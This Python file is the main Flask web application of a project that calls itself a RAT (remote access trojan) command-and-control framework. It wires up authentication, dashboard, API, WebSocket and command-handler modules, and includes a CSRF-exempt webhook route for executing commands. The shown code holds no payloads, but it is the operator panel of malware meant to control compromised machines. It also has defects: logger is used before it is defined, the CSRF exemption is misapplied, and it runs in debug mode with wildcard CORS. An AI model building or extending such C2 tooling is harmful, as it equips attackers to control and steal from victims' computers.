#!/usr/bin/env python3
"""
Main Flask Application for Oranolio RAT - Elite C2 Framework
Refactored from monolithic web_app_real.py into modular components
"""

import os
import sys
import logging
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response, Response
from flask_socketio import SocketIO, emit
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
from werkzeug.middleware.proxy_fix import ProxyFix

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# Import configuration
from config import Config

# Import route modules
from auth_routes import auth_bp
from api_routes import api_bp
from dashboard_routes import dashboard_bp
from websocket_handlers import register_websocket_handlers
from command_handlers import register_command_handlers

# Import new authentication and dashboard modules
from new_auth_routes import new_auth_bp
from new_dashboard_routes import new_dashboard_bp

# Import webhook authentication (uses HMAC signature validation)
try:
    from webhook_auth_routes import webhook_auth_bp
    WEBHOOK_AUTH_AVAILABLE = True
except ImportError:
    WEBHOOK_AUTH_AVAILABLE = False
    logger.warning("Webhook authentication module not available")

# Import admin setup routes
try:
    from admin_setup_routes import admin_setup_bp
    ADMIN_SETUP_AVAILABLE = True
except ImportError:
    ADMIN_SETUP_AVAILABLE = False
    logger.warning("Admin setup module not available")

# Import utilities
from auth_utils import login_required
from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
from validation_schemas import validate_input

# Import Phase 1 Enterprise Security Components
from core.security import (
    EnterpriseSessionManager,
    EnterpriseInputValidator,
    EnterpriseCryptoManager,
    EnterpriseErrorHandler
)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_app():
    """Create and configure the Flask application"""
    app = Flask(__name__)
    
    # Configure app
    app.config['SECRET_KEY'] = Config.SECRET_KEY
    app.config['SESSION_COOKIE_HTTPONLY'] = Config.SESSION_COOKIE_HTTPONLY
    app.config['SESSION_COOKIE_SAMESITE'] = Config.SESSION_COOKIE_SAMESITE
    
    # Configure ProxyFix for reverse proxy support
    if os.getenv('STITCH_BEHIND_PROXY', 'false').lower() in ('true', '1', 'yes'):
        x_for = int(os.getenv('STITCH_PROXY_X_FOR', '1'))
        x_proto = int(os.getenv('STITCH_PROXY_X_PROTO', '1'))
        x_host = int(os.getenv('STITCH_PROXY_X_HOST', '1'))
        x_prefix = int(os.getenv('STITCH_PROXY_X_PREFIX', '0'))
        
        app.wsgi_app = ProxyFix(
            app.wsgi_app,
            x_for=x_for,
            x_proto=x_proto,
            x_host=x_host,
            x_prefix=x_prefix
        )
    
    # Initialize Phase 1 Enterprise Security Components
    session_manager = EnterpriseSessionManager()
    input_validator = EnterpriseInputValidator()
    crypto_manager = EnterpriseCryptoManager()
    enterprise_error_handler = EnterpriseErrorHandler()
    
    # Store security components in app context
    app.session_manager = session_manager
    app.input_validator = input_validator
    app.crypto_manager = crypto_manager
    app.enterprise_error_handler = enterprise_error_handler
    
    logger.info("Phase 1 Enterprise Security Components initialized")
    
    # Initialize extensions
    socketio = SocketIO(app, cors_allowed_origins="*", logger=True, engineio_logger=True)
    limiter = Limiter(
        app=app,
        key_func=get_remote_address,
        default_limits=[f"{Config.DEFAULT_RATE_LIMIT_HOUR} per hour"]
    )
    
    # Initialize CSRF protection
    csrf = CSRFProtect(app)
    
    # Exempt webhook routes from CSRF (they use HMAC signature validation)
    @csrf.exempt
    def csrf_exempt_webhooks():
        """Exempt webhook routes from CSRF protection"""
        pass
    
    # Configure CSRF to skip webhook paths
    app.config['WTF_CSRF_EXEMPT_ENDPOINTS'] = ['webhook_auth.register_webhook', 
                                                 'webhook_auth.test_webhook',
                                                 'webhook_auth.execute_webhook_command']
    
    # Register blueprints
    app.register_blueprint(auth_bp)
    app.register_blueprint(api_bp)
    app.register_blueprint(dashboard_bp)
    
    # Register new authentication and dashboard blueprints
    app.register_blueprint(new_auth_bp)
    app.register_blueprint(new_dashboard_bp)
    
    # Register webhook authentication blueprint
    # Note: Webhook routes use HMAC signature validation instead of CSRF tokens
    if WEBHOOK_AUTH_AVAILABLE:
        app.register_blueprint(webhook_auth_bp)
    
    # Register admin setup blueprint
    if ADMIN_SETUP_AVAILABLE:
        app.register_blueprint(admin_setup_bp)
    
    # Register WebSocket handlers
    register_websocket_handlers(socketio)
    
    # Register command handlers
    register_command_handlers(app)
    
    # Add Phase 1 request validation middleware
    @app.before_request
    def validate_request_inputs():
        """Validate all incoming request data using Phase 1 InputValidator"""
        # Skip validation for static files
        if request.endpoint and request.endpoint == 'static':
            return None
        
        # Validate JSON payloads
        if request.is_json and request.get_json(silent=True):
            try:
                from core.security.input_validator import InputType
                json_data = request.get_json()
                validation_result = app.input_validator.validate_input(
                    json_data,
                    InputType.JSON_DATA,
                    context={'endpoint': request.endpoint}
                )
                if not validation_result.is_valid:
                    logger.warning(f"Invalid JSON input: {validation_result.violations}")
                    return jsonify({'error': 'Invalid input data'}), 400
            except Exception as e:
                logger.error(f"Input validation error: {e}")
        
        return None
    
    # Add security headers
    @app.after_request
    def add_security_headers(response):
        """Add security headers to all responses"""
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        
        # Content Security Policy
        if Config.CSP_ENABLED:
            import secrets
            nonce = secrets.token_urlsafe(16)
            g.csp_nonce = nonce
            csp_policy = Config.get_csp_policy(nonce)
            if Config.CSP_REPORT_ONLY:
                response.headers['Content-Security-Policy-Report-Only'] = csp_policy
            else:
                response.headers['Content-Security-Policy'] = csp_policy
        
        # Strict Transport Security (HTTPS only)
        if Config.ENABLE_HTTPS:
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
        
        return response
    
    # Enhanced Error handlers with Phase 1 EnterpriseErrorHandler
    @app.errorhandler(400)
    def bad_request(error):
        """Handle 400 errors with Phase 1 error handling"""
        from core.security.error_handler import ErrorSeverity, ErrorCategory
        
        context = {
            'user_id': session.get('user_id'),
            'ip_address': request.remote_addr,
            'endpoint': request.endpoint,
            'error': str(error)
        }
        error_info = app.enterprise_error_handler.handle_error(
            error, context
        )
        return jsonify({'error': 'Bad request', 'error_id': error_info.error_id}), 400
    
    @app.errorhandler(401)
    def unauthorized(error):
        """Handle 401 errors with Phase 1 error handling"""
        from core.security.error_handler import ErrorSeverity, ErrorCategory
        
        context = {
            'user_id': session.get('user_id'),
            'ip_address': request.remote_addr,
            'endpoint': request.endpoint,
            'error': str(error)
        }
        error_info = app.enterprise_error_handler.handle_error(
            error, context
        )
        return jsonify({'error': 'Unauthorized', 'error_id': error_info.error_id}), 401
    
    @app.errorhandler(403)
    def forbidden(error):
        """Handle 403 errors with Phase 1 error handling"""
        context = {
            'user_id': session.get('user_id'),
            'ip_address': request.remote_addr,
            'endpoint': request.endpoint,
            'error': str(error)
        }
        error_info = app.enterprise_error_handler.handle_error(
            error, context
        )
        return jsonify({'error': 'Forbidden', 'error_id': error_info.error_id}), 403
    
    @app.errorhandler(404)
    def not_found(error):
        """Handle 404 errors with Phase 1 error handling"""
        context = {
            'user_id': session.get('user_id'),
            'ip_address': request.remote_addr,
            'endpoint': request.endpoint,
            'error': str(error)
        }
        error_info = app.enterprise_error_handler.handle_error(
            error, context
        )
        return jsonify({'error': 'Not found', 'error_id': error_info.error_id}), 404
    
    @app.errorhandler(429)
    def rate_limit_exceeded(error):
        """Handle 429 errors with Phase 1 error handling"""
        context = {
            'user_id': session.get('user_id'),
            'ip_address': request.remote_addr,
            'endpoint': request.endpoint,
            'error': str(error)
        }
        error_info = app.enterprise_error_handler.handle_error(
            error, context
        )
        return jsonify({'error': 'Rate limit exceeded', 'error_id': error_info.error_id}), 429
    
    @app.errorhandler(500)
    def internal_error(error):
        """Handle 500 errors with Phase 1 error handling"""
        context = {
            'user_id': session.get('user_id'),
            'ip_address': request.remote_addr,
            'endpoint': request.endpoint,
            'error': str(error)
        }
        error_info = app.enterprise_error_handler.handle_error(
            error, context
        )
        return jsonify({'error': 'Internal server error', 'error_id': error_info.error_id}), 500
    
    # Phase 1 Crypto Helper Functions
    @app.context_processor
    def inject_crypto_helpers():
        """Inject Phase 1 crypto helpers into template context"""
        def encrypt_sensitive(data: str, key_id: str = 'master') -> dict:
            """Encrypt sensitive data using Phase 1 CryptoManager"""
            try:
                return app.crypto_manager.encrypt(data, key_id)
            except Exception as e:
                logger.error(f"Encryption error: {e}")
                return {}
        
        def decrypt_sensitive(encrypted_data: dict, key_id: str = 'master') -> str:
            """Decrypt sensitive data using Phase 1 CryptoManager"""
            try:
                result = app.crypto_manager.decrypt(encrypted_data, key_id)
                return result.get('plaintext', '')
            except Exception as e:
                logger.error(f"Decryption error: {e}")
                return ""
        
        return dict(
            encrypt_sensitive=encrypt_sensitive,
            decrypt_sensitive=decrypt_sensitive
        )
    
    # Health check endpoint
    @app.route('/health')
    def health():
        """Health check endpoint for deployment"""
        from datetime import datetime
        return jsonify({
            'status': 'healthy',
            'timestamp': str(datetime.now()),
            'phase1_security': {
                'session_manager': 'active',
                'input_validator': 'active',
                'crypto_manager': 'active',
                'error_handler': 'active'
            }
        })
    
    # Root route - redirect to new login
    @app.route('/')
    def index():
        """Root route - redirect to new authentication"""
        if session.get('authenticated'):
            return redirect('/dashboard')
        return redirect('/auth/login')
    
    # Store instances for external access
    app.socketio = socketio
    app.limiter = limiter
    app.csrf = csrf
    
    return app

# Create app instance
app = create_app()
socketio = app.socketio

# Import here to avoid circular imports
from datetime import datetime

if __name__ == '__main__':
    # This is for development only
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)